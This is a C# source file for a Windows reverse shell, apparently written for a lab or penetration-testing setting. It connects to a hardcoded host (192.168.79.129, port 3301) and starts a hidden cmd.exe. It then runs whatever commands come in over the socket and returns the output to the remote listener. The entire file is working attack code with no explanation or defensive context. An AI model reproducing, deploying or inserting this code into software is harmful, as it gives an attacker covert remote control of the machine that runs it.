using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("192.168.79.129", 3301))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process connection = new Process();
                        connection.StartInfo.FileName = "cmd.exe";
                        connection.StartInfo.CreateNoWindow = true;
                        connection.StartInfo.UseShellExecute = false;
                        connection.StartInfo.RedirectStandardOutput = true;
                        connection.StartInfo.RedirectStandardInput = true;
                        connection.StartInfo.RedirectStandardError = true;
                        connection.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        connection.Start();
                        connection.BeginOutputReadLine();
						
						while(true)
						{
							strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            connection.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
